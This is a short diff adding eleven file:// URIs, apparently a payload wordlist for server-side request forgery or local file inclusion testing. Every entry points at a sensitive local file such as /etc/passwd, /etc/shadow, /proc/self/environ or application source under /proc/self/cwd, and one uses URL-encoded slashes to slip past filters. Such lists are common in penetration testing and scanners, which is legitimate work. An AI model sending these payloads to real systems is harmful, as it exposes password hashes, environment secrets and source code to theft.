@@ -1,0 +1,11 @@
+file://%5C/%5C/etc/passwd
+file:///etc/hosts
+file:///etc/lsb-release
+file:///etc/passwd
+file:///etc/shadow
+file:///proc/self/cmdline
+file:///proc/self/cwd/application.py
+file:///proc/self/cwd/index.php
+file:///proc/self/cwd/main.py
+file:///proc/self/environ
+file:///proc/self/exe
